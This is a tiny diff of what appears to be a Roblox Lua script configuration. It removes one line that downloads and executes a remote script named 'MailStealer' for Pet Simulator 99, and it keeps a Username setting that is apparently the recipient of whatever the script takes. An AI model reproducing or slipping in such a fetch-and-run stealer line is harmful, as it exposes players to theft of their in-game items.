@@ -58,4 +58,4 @@ end
 Username = "ItsRyulox180"
 LoadScreen = true 
 
-loadstring(game:HttpGet("https://raw.githubusercontent.com/KiuuP/PS99_Mailstealer/main/MailStealer.lua"))()
+
